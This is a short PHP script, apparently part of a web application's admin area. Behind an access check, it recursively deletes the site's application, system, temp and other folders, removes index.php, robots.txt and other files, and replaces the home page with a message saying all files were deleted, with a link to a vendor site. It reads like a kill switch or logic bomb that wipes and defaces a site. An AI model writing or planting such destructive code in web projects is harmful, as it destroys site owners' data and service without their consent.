<?
include '../inc/functions.php'; 
access();  

$dir = $_SERVER['DOCUMENT_ROOT'].'/';
//  $dir = '/home/ukb1782/public_html/' ;
//echo $dir; exit;

 
deleteDir($dir.'application'); 
deleteDir($dir.'cono'); 
deleteDir($dir.'printer');
deleteDir($dir.'system');
deleteDir($dir.'temp');   
deleteDir($dir.'a'); 

unlink($dir.'index.php');  
unlink($dir.'index2.php');
unlink($dir.'robots.txt');
unlink($dir.'v.txt');

echo '<h1> File Deleted Successfully </h1>';


$content = "All Files deleted From This Site. For more details please contact 
<h1> <a href='http://allinepos.co.uk'> http://allinepos.co.uk </a> </h1> .";
$fp = fopen($dir . "index.php","wb");
fwrite($fp,$content);
fclose($fp);
?>



        

<?  go_back();     ?>